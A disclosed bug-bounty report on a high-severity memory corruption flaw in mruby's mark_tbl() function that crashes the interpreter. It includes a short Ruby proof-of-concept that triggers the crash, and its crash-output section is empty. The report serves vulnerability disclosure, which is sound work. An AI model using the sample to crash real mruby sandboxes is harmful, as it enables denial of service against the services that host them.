WeaknessName:Memory Corruption - Generic
Reporter:https://hackerone.com/jpenalbae

Severity:high
State:Closed
DateOfDisclosure:17.12.2016 2:29:27

Summary:

There is an invalid memory access on mruby when calling to `mark_tbl()` which causes a SIGSEGV and leads to denial of service.

## Sample

The following code triggers the bug (attached as mark_tbl.min2.rb):
```ruby
t0me=%
Array.new(9){t0me.empty?s=Array.new(9){%{}*0
s=Array.dup.new(23)
Array(0)}
Array(0..6)}
```

## Crash

Here we can see the crash (full crash output attached)

```

## Impact

Its impact seems to be limited to DoS of the service running the ruby sandbox. The invalid address can be controlled by the user but in a really limited way, so I doubut this chould be turned into a write-what-where type vuln.
